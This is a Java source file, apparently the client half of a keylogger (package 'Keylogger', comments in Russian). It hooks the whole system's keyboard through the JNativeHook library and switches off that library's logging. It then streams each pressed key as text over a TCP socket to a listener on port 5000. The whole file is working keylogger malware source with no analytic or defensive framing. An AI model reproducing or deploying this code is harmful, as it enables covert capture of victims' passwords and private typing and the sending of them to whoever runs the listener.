package Keylogger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.logging.Handler;
import java.util.logging.Level;
import java.util.logging.Logger;


public class Client implements NativeKeyListener {
    Socket client;
    PrintWriter writer;

    public static void main(String[] args) throws IOException {
        try {
            GlobalScreen.registerNativeHook(); // позволяет обнаружить нажатие клавиши
        } catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            System.exit(1); // выход из программы если есть ВОЗМОЖНЫЕ нежелательные ошибки
        }

        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());

        logger.setLevel(Level.OFF);

        Handler[] handlers = Logger.getLogger("").getHandlers();

        for (int i = 0; i < handlers.length; i++) {
            handlers[i].setLevel(Level.OFF);
        }

        Client localClient = new Client();

        localClient.go();

        GlobalScreen.addNativeKeyListener(localClient);
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent arg0) {
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        String data = NativeKeyEvent.getKeyText(e.getKeyCode()).toLowerCase();

        writer.println(data);
        writer.flush();
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
    }

    public void go() throws IOException {
        client = new Socket("127.0.0.1", 5000);
        writer = new PrintWriter(client.getOutputStream());
    }
}